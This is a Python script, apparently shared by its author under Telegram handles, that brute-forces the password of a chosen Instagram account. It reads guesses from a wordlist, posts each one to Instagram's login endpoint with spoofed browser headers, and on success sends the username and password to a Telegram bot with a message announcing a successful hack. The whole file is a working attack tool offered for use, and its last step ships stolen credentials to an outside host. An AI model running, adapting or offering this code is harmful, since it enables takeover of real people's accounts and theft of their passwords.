#!/usr/bin/env python3
import requests
import random
from user_agent import generate_user_agent as aa
R = '\033[1;31m' # أحمر
X = '\033[1;33m' # أصفر
F = '\033[2;32m' # أخضر
C = "\033[1;97m" # أبيض
B = '\033[2;36m' # سمائي
Y = '\033[1;34m' # أزرق فاتح
E = '\033[1;31m' # أحمر
B = '\033[2;36m' # سمائي
G = '\033[1;32m' # أخضر
S = '\033[1;33m' # أصفر
Z = '\033[1;31m' # أحمر
F = '\033[2;32m' # أخضر

a1 = '\x1b[1;31m' # أحمر
a2 = '\x1b[1;34m' # أزرق
a3 = '\x1b[1;32m' # أخضر
a4 = '\x1b[1;33m' # أصفر
a5 = '\x1b[38;5;208m' # برتقالي
a6 = '\x1b[38;5;5m' # أرجواني
a7 = '\x1b[38;5;13m' # وردي
a8 = '\x1b[1;30m' # أسود
a9 = '\x1b[1;37m' # أبيض
a10 = '\x1b[38;5;52m' # بني
a11 = '\x1b[38;5;8m' # رمادي
a12 = '\x1b[38;5;220m' # ذهبي
a13 = '\x1b[38;5;7m' # فضي
a14 = '\x1b[38;5;153m' # أزرق فاتح
a15 = '\x1b[38;5;18m' # أزرق داكن
a16 = '\x1b[38;5;48m' # أخضر فاتح
a17 = '\x1b[38;5;22m' # أخضر داكن
a18 = '\x1b[38;5;196m' # أحمر فاتح
a19 = '\x1b[38;5;88m' # أحمر داكن
a20 = '\x1b[38;5;226m' # أصفر فاتح
a21 = '\x1b[38;5;136m' # أصفر داكن
a22 = '\x1b[38;5;216m' # برتقالي فاتح
a23 = '\x1b[38;5;166m' # برتقالي داكن
a24 = '\x1b[38;5;234m' # أرجواني فاتح
a25 = '\x1b[38;5;91m' # أرجواني داكن
a26 = '\x1b[38;5;205m' # وردي فاتح
a27 = '\x1b[38;5;161m' # وردي داكن
a28 = '\x1b[38;5;236m' # أسود فاتح
a29 = '\x1b[38;5;233m' # أسود داكن
a30 = '\x1b[38;5;255m' # أبيض فاتح
a31 = '\x1b[38;5;231m' # أبيض داكن
a32 = '\x1b[38;5;180m' # بني فاتح
a33 = '\x1b[38;5;94m' # بني داكن
a34 = '\x1b[38;5;252m' # رمادي فاتح
a35 = '\x1b[38;5;246m' # رمادي داكن
a36 = '\x1b[38;5;228m' # ذهبي فاتح
a37 = '\x1b[38;5;172m' # ذهبي داكن
a38 = '\x1b[38;5;188m' # فضي فاتح
a39 = '\x1b[38;5;247m' # فضي داكن
a40 = '\x1b[38;5;117m' # أزرق سماوي
print(f'''{X}« {X} RT Al-Jubouri {F}⸙ {X}»
    {B}┏{Z}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{B}┓
    {Z}┃ {F}⌯ {C}Telegram {F} ›{a21} @aaaa1qaa             {Z}
    {Z}┃ {F}⌯ {C}channel{F}   ›{a26} @Y_Y_2_4           {Z}
    {Z}┃ {F}⌯ {C}name    {F}  › {a4}$ ابو تراب             {Z}     
 {Z}   ┃    
    ┃ {F}⌯ {a4} مرحبا بكم في اداتي المتتطوره
{Z}    ┃    
    {B}┗{Z}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{B}┛ ''')

ID =input(f"{R}({X}-{R}) {X} ID {R}: "+X)
token =input(f"{R}({X}-{R}) {X} TOKEN {R} : "+X)
r = requests.Session()
pas = input(X+'ENTER YOUR FILE : ')
rfile = open(pas, 'r')
aa = input(X+'\x1b[38;5;180mTarget User : ')
print(F+'*'*60)
while True:
 username = aa
 password = rfile.readline().split('\n')[0]
 
 url = 'https://www.instagram.com/accounts/login/ajax/'
  
  
 headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': str(aa()),
    'x-asbd-id': '359341',
    'x-csrftoken': 'gwKvmgAHwSjoTnfIlFl8OhS1PMHsbkJ8',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1026259405',
    'x-requested-with': 'XMLHttpRequest',
    'x-web-session-id': '4f3140:kg16a3:82ypxw',
}
         
         
 data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}


 req_login = r.post(url, headers=headers, data=data, proxies=None)
 
 if 'userId' in req_login.text:
  print(F+'User name : '+username)
  print(F+'Password : '+password)
  send  = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 
_-_-_-_-_-_-_-_-_-_-_
  تم الاختراق بنجاح ✅ ابو تراب
user ➪ {username} 

pass ➪ {password}

by : @aaaa1qaa
_-_-_-_-_-_-_-_-_-_-_
''')
  i = requests.post(send)
  break    

 else:
  print(Z+'Bad : ',username+'  :  '+password)
